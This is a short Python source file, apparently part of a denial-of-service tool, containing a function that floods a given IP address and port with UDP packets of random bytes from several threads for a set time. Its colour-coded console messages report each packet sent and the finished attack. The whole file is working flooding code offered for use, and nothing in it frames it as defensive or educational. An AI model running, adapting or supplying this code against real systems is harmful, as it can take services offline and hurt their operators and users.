#!/usr/bin/env python3

import random
import time
import socket
from threading import Thread

def UDP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False
	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting UDP attack...")
	

	threads_list = []

	# UDP flood
	def udp_flood():
		global FINISH
		# Create socket
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while True:
			if FINISH:
				break
			# Send random payload
			try:
				for _ in range(16):
					payload = random._urandom(random.randint(1, 60))
					sock.sendto(payload, (target_ip, target_port))
			except Exception as e:
				print(e)
			else:
				print("\033[1;32m"+"[+]"+"\033[0m"+" UDP packet with size " + str(len(payload)) + " was sent!")

	# Start threads
	for thread in range(threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread)+ "...")
		t = Thread(target = udp_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.")
